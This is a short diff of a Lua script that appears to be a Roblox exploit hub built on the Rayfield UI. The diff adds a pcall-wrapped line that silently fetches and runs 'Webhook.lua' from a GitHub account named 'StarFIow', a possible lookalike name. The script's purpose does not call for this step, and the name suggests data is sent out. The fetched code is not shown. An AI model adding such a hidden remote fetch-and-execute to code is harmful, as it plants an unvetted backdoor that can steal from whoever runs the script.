@@ -21,6 +21,9 @@ pcall(function()
     local DevTools = loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/Scripts/refs/heads/main/Utility/Devtools.lua"))()
     DevTools("GetTag")
 end)
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
+end)
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local Window = Rayfield:CreateWindow({
